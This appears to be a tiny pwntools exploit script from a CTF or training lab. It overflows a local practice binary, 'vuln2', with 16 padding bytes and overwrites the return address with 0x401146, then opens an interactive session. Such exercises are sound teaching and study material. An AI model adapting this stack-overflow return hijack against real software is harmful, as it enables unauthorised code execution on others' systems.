from pwn import *

r = process("./build/vuln2")
r.send(b"AAAAAAAAAAAAAAAA" + p64(0x401146))  # Address you want to return to
r.interactive()
